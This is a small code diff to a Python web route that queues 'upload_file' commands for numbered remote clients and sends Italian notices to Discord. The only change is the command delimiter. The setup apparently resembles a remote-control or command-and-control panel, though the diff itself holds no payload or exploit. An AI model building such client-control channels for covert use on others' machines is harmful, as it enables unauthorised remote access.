@@ -398,7 +398,7 @@ def send_upload_command():
     destination = request.form.get('destination')
     
     if client_id and filename and destination:
-        command = f"upload_file:{filename}:{destination}"
+        command = f"upload_file|{filename}|{destination}"
         client_manager.add_command(int(client_id), command)
         send_to_discord(f"📤 Upload richiesto: {filename} → {destination} su client {client_id}")
     
